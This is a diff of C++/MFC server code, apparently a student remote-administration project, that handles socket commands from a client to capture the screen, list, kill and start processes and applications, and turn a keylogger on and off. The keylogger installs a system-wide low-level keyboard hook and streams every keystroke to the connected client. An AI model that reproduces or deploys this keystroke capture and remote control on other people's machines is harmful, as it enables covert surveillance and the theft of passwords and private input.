@@ -11,33 +11,7 @@
 
 namespace fs = std::filesystem;
 
-std::string getFirstWord(char* str) {
-    std::string firstWord;
-    int i = 0;
-    while (str[i] != '\0' && str[i] != ' ') {
-        firstWord += str[i];
-        i++;
-    }
-    return firstWord;
-}
-
-std::string getSecondWord(char* input) {
-    std::istringstream iss(input);
-    std::string word1, word2;
-    iss >> word1 >> word2;
-    return word2;
-}
-
-// CReceivingSocket
-
-CReceivingSocket::CReceivingSocket()
-{
-    m_timerId = SetTimer(NULL, TIMER_ID_KEYSTROKE, 100, NULL);
-}
-
-CReceivingSocket::~CReceivingSocket()
-{
-}
+HHOOK CReceivingSocket::m_hook = NULL;
 
 std::string getFirstWord(const char* str) {
     std::string firstWord;
@@ -56,22 +30,43 @@ std::string getSecondWord(const char* input) {
     return word2;
 }
 
+std::string removeFirstWord(const char* input)
+{
+    std::istringstream iss(input);
+    std::string firstWord;
+    iss >> firstWord;
+    std::string remainingText;
+    std::getline(iss, remainingText);
+    remainingText.erase(0, 1);
+    return remainingText;
+}
+
+CReceivingSocket::CReceivingSocket()
+{
+}
+
+CReceivingSocket::~CReceivingSocket()
+{
+}
+
 void CReceivingSocket::OnReceive(int nErrorCode)
 {
     char buffer[256] = "";
 	this->Receive(buffer, 256);
     buffer[strlen(buffer)] = '\0';
     
-    CStringA strMsg(buffer); AfxMessageBox(strMsg);
+    CStringA strMsg(buffer);
     int len = MultiByteToWideChar(CP_UTF8, 0, strMsg, -1, NULL, 0);
     CStringW wstrMsg;
-    int wideLen = MultiByteToWideChar(CP_UTF8, 0, strMsg, -1, wstrMsg.GetBuffer(len), len); MessageBoxW(nullptr, wstrMsg, L"Server", MB_OK);
+    int wideLen = MultiByteToWideChar(CP_UTF8, 0, strMsg, -1, wstrMsg.GetBuffer(len), len); 
+
+    m_strMsg = strMsg;
 
 	if (L"REQ_CSCR" == wstrMsg)
 	{
 		OnReceiveCapScreen(nErrorCode);
 	}
-    else if (L"REQ_KSTR" == wstrMsg)
+    else if (strMsg.Left(CString("REQ_KSTR").GetLength()) == CString("REQ_KSTR"))
     {
         OnReceiveKeystroke(nErrorCode);
     }
@@ -93,14 +88,28 @@ void CReceivingSocket::OnReceive(int nErrorCode)
         int Pid = std::stoi(PID);
         OnReceiveShowPro_Kill(nErrorCode, Pid);
     }
+    else if (getFirstWord(strMsg) == "REQ_SPRO_START") {
+        std::string namePro = getSecondWord(strMsg);
+        OnReceiveShowPro_Start(nErrorCode, namePro);
+    }
+    else if (L"REQ_SAPP" == wstrMsg) {
+        OnReceiveShowApp(nErrorCode);
+    }
+    else if (getFirstWord(strMsg) == "REQ_SAPP_KILL") {
+        std::string nameApp = removeFirstWord(strMsg);
+        OnReceiveShowApp_Kill(nErrorCode, nameApp);
+    }
+    else if (getFirstWord(strMsg) == "REQ_SAPP_START") {
+        std::string nameApp = removeFirstWord(strMsg);
+        OnReceiveShowApp_Start(nErrorCode, nameApp);
+    }
+
 	CSocket::OnReceive(nErrorCode);
 }
 
 
 void CReceivingSocket::OnClose(int nErrorCode)
 {
-	// TODO: Add your specialized code here and/or call the base class
-	//AfxMessageBox("Connection Closed!");
 	Close();
 	CSocket::OnClose(nErrorCode);
 }
@@ -231,18 +240,48 @@ PreReturnCleanup: // labelled goto destination
 
 void CReceivingSocket::OnReceiveKeystroke(int nErrorCode)
 {
-    // Continuously send the name of the keystroke that has been tapped to the client
-    // while (flag)
-    while (1)
-    {   
-        CString keystrokeName(Keystroke().c_str()); 
-        if (keystrokeName != " ")
-            this->Send(keystrokeName, keystrokeName.GetLength());
-        if (keystrokeName == "[ESC]")
-            break;
-        Sleep(10);
+    if (m_hook == NULL && m_strMsg == "REQ_KSTR_HOOK")
+    {
+        // Install a hook to detect keystrokes
+        m_hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
+
+        // Wait for keystrokes to be detected
+        MSG msg;
+        while (GetMessage(&msg, NULL, 0, 0))
+        {
+            TranslateMessage(&msg);
+            DispatchMessage(&msg);
+        }
     }
-    //this->Close();
+    else if (m_hook != NULL && m_strMsg == "REQ_KSTR_UNHOOK")
+    {
+        // Uninstall the hook
+        UnhookWindowsHookEx(m_hook);
+        m_hook = NULL;
+    }
+}
+
+LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
+{
+    if (nCode == HC_ACTION)
+    {
+        KBDLLHOOKSTRUCT* pKeyboardHookStruct = (KBDLLHOOKSTRUCT*)lParam;
+
+        // Check if the user pressed a key down
+        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)
+        {
+            CString keystrokeName = GetKeystrokeName(pKeyboardHookStruct->vkCode);
+            if (keystrokeName != " ") {
+                ((CServerApp*)AfxGetApp())->m_ServerSocket.m_ReceivingSocket.Send(keystrokeName.GetBuffer(keystrokeName.GetLength()), keystrokeName.GetLength());
+            }
+                
+            if (keystrokeName == _T("[ESC]"))
+                PostQuitMessage(0);
+        }
+    }
+
+    // Pass the message on to the next hook procedure
+    return CallNextHookEx(NULL, nCode, wParam, lParam);
 }
 
 BOOL CReceivingSocket::OnReceiveBrowseDisk(int nErrorCode)
@@ -310,8 +349,23 @@ void CReceivingSocket::OnReceiveBrowseDir(int nErrorCode, CStringW path)
     }
 }
 
-bool CReceivingSocket::OnReceiveShowPro_Kill(int nErrorCode, int Pid) {
-    return killProcess(Pid);
+void  CReceivingSocket::OnReceiveShowPro_Kill(int nErrorCode, int Pid) {
+    CString msg;
+    if (killProcess(Pid)) {
+        msg = "Suceessed!";
+    }
+    else
+        msg = "Failed!";
+    Send(msg.GetBuffer(msg.GetLength()), msg.GetLength(), 0);
+}
+
+void CReceivingSocket::OnReceiveShowPro_Start(int nErrorCode, std::string namePro) {
+    CString msg;
+    if (startProcess(namePro))
+        msg = "Successed!";
+    else
+        msg = "Failed!";
+    Send(msg.GetBuffer(msg.GetLength()), msg.GetLength(), 0);
 }
 
 void CReceivingSocket::OnReceiveShowPro(int nErrorCode) {
@@ -350,9 +404,33 @@ void CReceivingSocket::OnReceiveShowPro(int nErrorCode) {
     // Close the process snapshot handle
     CloseHandle(hProcessSnap);
 
-    //MessageBox((LPCTSTR)msg, "Server");
-
     Send(msg.GetBuffer(msg.GetLength()), msg.GetLength(), 0);
 }
 
+// FOR SHOW APPS
+void CReceivingSocket::OnReceiveShowApp(int ErrorCode) {
+    CString msg = GetAllWindowTitles();
+    Send(msg.GetBuffer(msg.GetLength()), msg.GetLength(), 0);
+}
 
+void CReceivingSocket::OnReceiveShowApp_Kill(int nErrorCode, std::string appName) {
+    CString msg;
+    CString tmp(appName.c_str());
+    MessageBox(NULL, tmp, "ALOALO", MB_OK | MB_ICONINFORMATION);
+    if (TerminateApplication(appName)) {
+        msg = "Successed!";
+    }
+    else {
+        msg = "Failed!";
+    }
+    Send(msg.GetBuffer(msg.GetLength()), msg.GetLength(), 0);
+}
+
+void CReceivingSocket::OnReceiveShowApp_Start(int nErrorCode, std::string appName) {
+    CString msg;
+    if (startApp(appName))
+        msg = "Successed!";
+    else
+        msg = "Failed!";
+    Send(msg.GetBuffer(msg.GetLength()), msg.GetLength(), 0);
+}
